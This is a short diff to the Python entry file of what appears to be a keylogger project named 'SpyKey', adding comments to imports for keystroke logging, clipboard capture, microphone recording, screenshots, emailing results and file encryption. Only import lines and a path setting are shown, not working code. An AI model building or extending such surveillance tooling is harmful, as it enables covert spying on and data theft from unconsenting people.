@@ -1,20 +1,17 @@
-from sysinfo import computer_information
-from clipboard import copy_clipboard
-from keystroke import log_keystrokes
-from microphone import record_microphone
-from screenshot import capture_screenshot
-from sendmail import send_email
+from sysinfo import computer_information  # Import the function to retrieve system information
+from clipboard import copy_clipboard  # Import the function to copy clipboard contents
+from keystroke import log_keystrokes  # Import the function to log keystrokes
+from microphone import record_microphone  # Import the function to record microphone input
+from screenshot import capture_screenshot  # Import the function to capture screenshots
+from sendmail import send_email  # Import the function to send emails
 from encryption import encrypt_files  # Import the encryption function
 import os
 import shutil
 import zipfile
-from pynput.keyboard import Key, Listener
+from pynput.keyboard import Key, Listener  # Import classes for handling keyboard events
 import win32gui
 import win32clipboard
-from threading import Lock
-
-# Define the file path
-#file_path = "C:\\Code\\SpyKey - An Advanced Keylogger\\Keylogger"
+from threading import Lock  # Import the Lock class for thread synchronization
 
 # Define the file path (relative path)
 file_path = ".\\Keylogger"
